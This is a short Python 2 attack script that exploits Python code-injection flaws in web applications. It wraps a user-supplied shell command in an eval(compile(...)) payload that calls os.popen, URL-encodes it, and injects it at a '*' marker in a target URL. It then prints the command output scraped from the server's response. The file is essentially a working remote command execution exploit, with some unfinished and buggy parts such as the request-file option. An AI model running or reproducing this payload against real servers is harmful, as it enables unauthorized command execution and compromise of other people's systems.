#!/usr/bin/python
import requests, re, optparse, urllib


#def parse_url(url):
#    user_url = url.split('*')
#    #print user_url[0]
#    #print user_url[1]
#    modified_url = '%s%s%s' % (user_url[0],encoded,user_url[1])
#    print modified_url
#    return modified_url	

def parse_request(filename):
    with open(filename) as file:
        request = file.read
        

def run_command(command,injection):
    insert = '''eval(compile("""for x in range(1):\\n import os\\n print("-"*50)\\n os.popen(r'%s').read()""",'PyCodeInjectionShell','single'))''' % command
    #print name
    encoded = urllib.quote(insert)
    #print encoded
    #url = 'http://192.168.81.152:8080/pyinject?param1=%s&param2=1' % encoded
    user_url = injection.split('*')
    #print user_url[0]
    #print user_url[1]
    url = '%s%s%s' % (user_url[0],encoded,user_url[1])
    print("URL sent to server: " + url)
    response = requests.get(url)
    #print response.headers
    #print response.content
    match = re.search('([--------------------------------------------------][\n])(.*)',response.content)
    #print match
    command_output = str(match.group(0))
    print '\n\n{}\nOUTPUT OF: {}\n{}\n'.format('-'*30,command,'-'*30)
    print command_output.replace('\\n','\n')
    # print command_output
        
if __name__ == '__main__':

    parser = optparse.OptionParser('python %prog -c command')
    parser.add_option('-c', dest='command')
    parser.add_option('-u', dest='url')
    parser.add_option('-r', dest='request')
    (options, args) = parser.parse_args()
    cmd = options.command
    url = options.url
    request = options.request
    print
    if (options.url) and (options.request):
        print "you can only have one"
        exit()
    if (options.url):
        print("URL entered by user: " + options.url)
        #modified_url = parse_url(options.url)
        run_command(cmd,options.url)
    if (options.request):
        run_command(cmd,request)
        

